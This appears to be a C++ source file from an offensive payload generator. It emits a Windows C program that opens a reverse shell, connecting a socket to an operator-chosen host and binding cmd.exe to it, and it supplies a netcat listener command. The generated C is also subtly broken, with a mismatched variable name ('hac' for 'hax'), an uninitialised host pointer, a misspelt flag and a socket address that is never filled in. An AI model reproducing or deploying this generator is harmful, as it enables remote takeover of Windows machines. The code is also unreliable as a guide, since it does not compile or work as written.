#include "C_Windows_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>

std::string CWindowsPayload::name() const {
return "c_windows";
}

std::string CWindowsPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "#include <winsock2.h>\n"
       << "#include <stdio.h>\n"
       << "#pragma comment(lib, \"ws2_32\")\n\n"
       << "WSADATA wsaData;\n"
       << "SOCKET Winsock;\n"
       << "struct sockaddr_in hax;\n"
       << "char ip_addr[16] = \"" << opts.host << "\";\n"
       << "char port[6] = \"" << std::to_string(opts.port) << "\";\n\n"
       << "STARTUPINFO ini_processo;\n\n"
       << "PROCESS_INFORMATION processo_info;\n\n"
       << "int main()\n"
       << "{\n"
       << "     WSAStartup(MAKEWORD(2, 2), &wsaData);\n"
       << "     Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n\n"
       << "     struct hostent *host;\n"
       << "     strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\n\n"
       << "     WSAConnect(Winsock, (SOCKADDR*)&hac, sizeof(hax), NULL, NULL, NULL, NULL);\n\n"
       << "     memset(&ini_processo, 0, sizeof(ini_processo));\n"
       << "     ini_processo.cb = sizeof(ini_processo);\n"
       << "     ini_processo.dwFlags = STARTF_UESTDHANDLES | STARTF_USESHOWWINDOW;\n"
       << "     ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n"
       << "     TCHAR cmd[255] = TEXT(\"cmd.exe\");\n\n"
       << "     CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n\n"
       << "     return 0;\n"
       << "}\n";
    return ss.str();
}

std::string CWindowsPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}